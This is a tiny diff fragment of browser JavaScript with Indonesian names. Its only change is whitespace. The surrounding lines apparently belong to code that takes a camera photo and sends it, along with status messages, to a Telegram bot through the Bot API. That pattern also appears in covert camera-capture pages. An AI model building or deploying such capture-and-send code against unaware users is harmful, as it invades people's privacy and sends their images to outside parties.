@@ -71,7 +71,7 @@ async function kirimFoto() {
     await kirimPesanTelegram("Gagal mengambil foto. Akses kamera ditolak atau error.");
   }
 }
-
+        
 async function kirimPesanTelegram(pesan) {
 const url = (`https://api.telegram.org/bot${token}/sendMessage`);
 await fetch(url, {
